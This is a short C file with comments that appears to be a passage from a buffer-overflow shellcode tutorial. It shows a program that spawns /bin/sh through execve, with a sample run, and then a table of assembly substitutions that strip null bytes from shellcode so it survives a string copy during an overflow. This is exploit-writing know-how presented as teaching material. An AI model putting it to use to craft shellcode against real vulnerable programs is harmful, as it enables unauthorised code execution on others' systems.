#include <unistd.h>
#include <stdlib.h>

/*
 If we compile this code and run it, we can see that it will spawn a shell for us.

[jack@0day local]$ gcc shell.c -o shell
[jack@0day local]$ ./shell
sh-2.05b# 
*/
int main()
{
  char *name[2];
   
  name[0] = "/bin/sh";
  name[1] = 0x0;
  execve(name[0], name, 0x0);
  exit(0);
}



/*
It works! But there is an obstacle.  In most cases we'll be trying to
overflow a character buffer.  As such any null bytes in our shellcode will be
considered the end of the string, and the copy will be terminated.  There must
be no null bytes in the shellcode for the exploit to work.  Let's try to
eliminate the bytes (and at the same time make it smaller).

           Problem instruction:                 Substitute with:
           --------------------------------------------------------
           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
           molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
                                                movl   %eax,0xc(%esi)
           --------------------------------------------------------
           movl   $0xb,%eax                     movb   $0xb,%al
           --------------------------------------------------------
           movl   $0x1, %eax                    xorl   %ebx,%ebx
           movl   $0x0, %ebx                    movl   %ebx,%eax
                                                inc    %eax
           --------------------------------------------------------
*/




